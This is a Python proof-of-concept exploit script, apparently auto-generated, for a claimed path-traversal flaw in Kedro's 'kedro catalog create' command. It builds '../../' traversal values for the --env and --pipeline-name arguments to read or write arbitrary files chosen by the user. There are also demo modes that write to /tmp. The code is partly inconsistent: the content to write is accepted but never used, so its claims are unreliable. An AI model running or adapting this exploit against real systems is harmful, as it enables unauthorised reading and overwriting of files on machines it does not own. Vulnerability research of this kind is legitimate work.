#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-007
# Sink: _add_missing_datasets_to_catalog
# Auto-generated — run with: python3 lfi_cli_arguments__add_missing_datasets_to_catalog.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro LFI vulnerability.

Vulnerability: Path traversal in create_catalog CLI command.
The 'env' and 'pipeline_name' parameters are used directly in file path construction
without sanitization, allowing an attacker to read/write files outside the intended directory.

Impact: Arbitrary file read/write on the target system.
"""

import argparse
import sys
import os
import tempfile
import subprocess
from pathlib import Path

def check_kedro_installed():
    """Verify kedro is available in the environment."""
    try:
        subprocess.run(["kedro", "--version"], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def create_poc_project():
    """Create a temporary Kedro project for testing."""
    tmp_dir = tempfile.mkdtemp(prefix="kedro_poc_")
    os.chdir(tmp_dir)
    
    # Create minimal Kedro project structure
    project_name = "poc_project"
    subprocess.run(["kedro", "new", "--name", project_name, "--tools", "none", 
                   "--starter", "pandas-iris"], capture_output=True, check=True)
    
    project_path = Path(tmp_dir) / project_name
    os.chdir(project_path)
    return project_path

def exploit_lfi(project_path, read_file=None, write_file=None, write_content=None):
    """
    Exploit the LFI vulnerability in Kedro's create_catalog command.
    
    Args:
        project_path: Path to the Kedro project
        read_file: Path to file to read (if None, will attempt write)
        write_file: Path to file to write (if None, will attempt read)
        write_content: Content to write to the file
    """
    if read_file:
        # Attempt to read arbitrary file using path traversal
        # The path becomes: <conf_source>/<env>/catalog_<pipeline_name>.yml
        # We use env to traverse up and read the target file
        env_path = f"../../{read_file.parent}"
        pipeline_name = read_file.stem
        
        # The catalog file must exist for reading, so we'll try to read it
        # by making the pipeline_name match the target filename
        cmd = [
            "kedro", "catalog", "create",
            "--env", env_path,
            "--pipeline-name", pipeline_name
        ]
        
        print(f"[*] Attempting to read file: {read_file}")
        print(f"[*] Command: {' '.join(cmd)}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] Success! File read attempted.")
            print(f"[*] stdout: {result.stdout}")
            print(f"[*] stderr: {result.stderr}")
        else:
            print(f"[-] Failed to read file.")
            print(f"[*] stdout: {result.stdout}")
            print(f"[*] stderr: {result.stderr}")
            
    elif write_file:
        # Attempt to write arbitrary file using path traversal
        # We'll create a catalog file that will be written to the target location
        env_path = f"../../{write_file.parent}"
        pipeline_name = write_file.stem.replace("catalog_", "")
        
        # First, we need to create a pipeline with the right name
        # to trigger the catalog creation
        pipeline_name_clean = pipeline_name.replace(".yml", "")
        
        cmd = [
            "kedro", "catalog", "create",
            "--env", env_path,
            "--pipeline-name", pipeline_name_clean
        ]
        
        print(f"[*] Attempting to write file: {write_file}")
        print(f"[*] Command: {' '.join(cmd)}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] Success! File write attempted.")
            print(f"[*] stdout: {result.stdout}")
            print(f"[*] stderr: {result.stderr}")
            
            # Check if the file was created
            if write_file.exists():
                print(f"[+] File created successfully at: {write_file}")
                print(f"[*] Content: {write_file.read_text()}")
            else:
                print(f"[-] File was not created at expected location")
        else:
            print(f"[-] Failed to write file.")
            print(f"[*] stdout: {result.stdout}")
            print(f"[*] stderr: {result.stderr}")

def main():
    parser = argparse.ArgumentParser(description="Kedro LFI PoC Exploit")
    parser.add_argument("--read", help="File to read (path traversal)")
    parser.add_argument("--write", help="File to write (path traversal)")
    parser.add_argument("--content", help="Content to write (optional)")
    parser.add_argument("--safe", action="store_true", 
                       help="Use safe payload (touch /tmp/poc_success.txt)")
    
    args = parser.parse_args()
    
    # Check if kedro is installed
    if not check_kedro_installed():
        print("[-] Kedro is not installed or not in PATH.")
        print("[*] Install with: pip install kedro")
        sys.exit(1)
    
    # Create temporary project
    print("[*] Creating temporary Kedro project...")
    try:
        project_path = create_poc_project()
        print(f"[+] Project created at: {project_path}")
    except Exception as e:
        print(f"[-] Failed to create project: {e}")
        sys.exit(1)
    
    # Determine payload
    if args.safe:
        # Safe payload: write to /tmp/poc_success.txt
        target_file = Path("/tmp/poc_success.txt")
        content = "Kedro LFI PoC successful!"
        print(f"[*] Using safe payload: write '{content}' to {target_file}")
        exploit_lfi(project_path, write_file=target_file, write_content=content)
    elif args.read:
        target_file = Path(args.read)
        exploit_lfi(project_path, read_file=target_file)
    elif args.write:
        target_file = Path(args.write)
        content = args.content or "PoC exploit content"
        exploit_lfi(project_path, write_file=target_file, write_content=content)
    else:
        # Default: demonstrate the vulnerability with a safe test
        print("[*] No specific target provided. Running safe demonstration...")
        target_file = Path("/tmp/kedro_poc_test.txt")
        content = "Kedro LFI vulnerability confirmed!"
        print(f"[*] Attempting to write to: {target_file}")
        exploit_lfi(project_path, write_file=target_file, write_content=content)
    
    # Cleanup
    print("[*] Cleaning up temporary project...")
    import shutil
    shutil.rmtree(project_path.parent, ignore_errors=True)
    print("[+] Done!")

if __name__ == "__main__":
    main()
